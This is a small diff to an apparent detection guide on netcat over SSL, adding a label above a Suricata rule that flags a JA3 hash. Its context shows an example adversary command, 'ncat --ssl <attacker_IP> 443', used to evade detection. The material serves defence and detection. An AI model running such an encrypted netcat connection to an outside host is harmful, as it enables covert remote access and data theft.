@@ -128,7 +128,8 @@ Adversaries often wrap netcat in SSL to evade detection:
 ncat --ssl <attacker_IP> 443  
 ```  
 **Detection**:  
-- Use JA3/S hashes to fingerprint SSL/TLS clients (ncat uses OpenSSL libraries):  
+- Use JA3/S hashes to fingerprint SSL/TLS clients (ncat uses OpenSSL libraries):
+- Suricata rule:  
   ```suricata  
   alert tls any any -> any any (msg:"Suspicious JA3 Hash"; ja3.hash; content:"a0e9f5d64349fb13191bc781f81f42e1"; sid:1000002;)  
   ```  
